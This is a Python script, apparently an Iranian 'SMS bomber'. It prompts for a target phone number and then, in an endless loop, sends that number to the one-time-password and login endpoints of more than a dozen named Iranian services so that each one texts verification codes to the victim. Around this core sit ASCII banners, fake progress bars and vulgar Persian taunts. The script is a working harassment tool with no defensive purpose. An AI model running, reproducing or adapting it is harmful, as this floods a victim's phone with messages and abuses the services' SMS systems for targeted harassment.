from cgi import print_directory
from requests import post , get
import time
import os
import sys
import _thread
class colorma:

    CYAN = '\033[96m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDER = '\033[4m'
    #--- ITS END ---
    END = '\033[0m'
from colorama import Fore
os.system('cls')
print(Fore.GREEN + """
__  __ _____ ____    _  _____ ____  _   _
|  \/  | ____/ ___|  / \|_   _|  _ \| \ | |
| |\/| |  _|| |  _  / _ \ | | | |_) |  \| |
| |  | | |__| |_| |/ ___ \| | |  _ <| |\  |
|_|  |_|_____\____/_/   \_\_| |_| \_\_| \_|

| """)
print ('\nHARLT|Sir.web')
print ('\neski kos madart ')
print(f" \n          [start sms]{colorma.GREEN}")
time.sleep(2)

os.system("clear")

print(f"{colorma.BLUE}")
print(f"\n[##]{colorma.RED}")
time.sleep(0.5)
print(f"\n[###]{colorma.YELLOW}")
time.sleep(0.5)
print("\n[####]")
time.sleep(0.5)
print("\n[#####]")
time.sleep(0.5)
print("\n[######]")
time.sleep(0.5)
print("\n[#######]")
time.sleep(0.5)
print("\n[########]")
time.sleep(0.5)
print("\n[#########]")
time.sleep(0.)
print("\n[##########]")
time.sleep(0.5)
print("\n[###########]")
time.sleep(0.5)
print("\n[############]")
time.sleep(0.5)
print("\n[#############]")
time.sleep(0.5)
print("\n[##############]")
time.sleep(0.5)
print("\n[###############]")
time.sleep(0.5)
print("\n[################]")
time.sleep(0.5)
print("\n[#################]")
time.sleep(0.5)
print("\n[##################]")
time.sleep(0.5)
print("\n[####################]")
time.sleep(0.5)
print("\n[######################]")
time.sleep(0.5)
print ("""
 __  __ _____ ____    _      ____   ___  __  __ ____  _____
|  \/  | ____/ ___|  / \    | __ ) / _ \|  \/  | __ )| ____|| |\/| |  _|| |  _  / _ \   |  _ \| | | | |\/| |  _ \|  _|  | |  | | |__| |_| |/ ___ \  | |_) | |_| | |  | | |_) | |___ |_|  |_|_____\____/_/   \_\ |____/ \___/|_|  |_|____/|_____|
""")
print ("""\..............
            ..,;:ccc,.
          ......```;lxO.
.....````..........,:ld;
           .`;;;:::;,,.x,
      ..```.            0Xxoc:,.  ...
  ....                ,ONkc;,;cokOdc`,.
 .                   OMo           `:ddo.
                    dMc               :OO;
                    0M.                 .:o.
                    ;Wd
                     ;XO,
                       ,d0Odlc;,..
                           ..`,;:cdOOd::,.
                                    .:d;.`:;.
                                       'd,  .`
                                         ;l   ..
                                          .o
                                            c
                                            .`
                                             .""")
print ('\n@megatrn')
time.sleep(2)
number = input(' \n@megatrn~#Tarket number (09*********  : ')



##########################################

snapj = {"phone":number}
tapsi1 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
divarj = {"phone":number}
emd = "send=1&cellphone="+number
rubj = {"api_version":"3","method":"sendCode","data":{"phone_number":number,"send_type":"SMS"}}
bamad = "cellNumber="+number
ali = {"phoneNumber": number }
hamrah = {"action":"getAppViaSMS","number": number }
arkd = {"mobile":number,"country_code":"IR","provider_code":"RUBIKA"}
digikala = {"phone":number}
sheypoor = {"phone":number}
while True:
    
    r3 = post("https://api.tapsi.cab/api/v2/user",json=tapsi1)
    if r3.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh ' , number)
    else:
        print(Fore.RED +'  □  kir shodi ' , number)
    r4 = post("https://api.divar.ir/v5/auth/authenticate",json=divarj)
    if r4.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r5 = post("https://messengerg2c42.iranlms.ir/",json=rubj)
    if r5.status_code == 200:
        print(Fore.GREEN +'  ■ raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □ kir shodi' , number)
    r6 = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snapj)
    if r6.status_code == 200:
        print(Fore.GREEN +'  ■ raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r7 = post("https://web.emtiyaz.app/json/login",data=emd)
    if r7.status_code == 200:
        print(Fore.GREEN +'  ■ raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r8 = post("https://bama.ir/signin-checkforcellnumber",data=bamad)
    if r8.status_code == 200:
        print(Fore.GREEN +'  ■ raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r9 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=ali)
    if r9.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r11 = post("https://api.chartex.net/api/v2/user/validate",json=arkd)
    if r11.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r12 = get("https://api.torob.com/a/phone/send-pin/?phone_number="+number)
    if r12.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r13 = get("https://api.binjo.ir/api/panel/get_code/"+number)
    if r13.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r14 = get("https://core.gap.im/v1/user/add.json?mobile="+number)
    if r14.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r15 = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}')
    if r15.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh  ' , number)
    else:
        print(Fore.RED +'  □  kir shodi' , number)
    r16 = post("https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/",json=digikala)
    if r16.status_code == 200:
        print(Fore.GREEN +'  ■  raft to madaresh ' , number)
    else:
        print(Fore.RED +' □  kir shodi' , number)
        
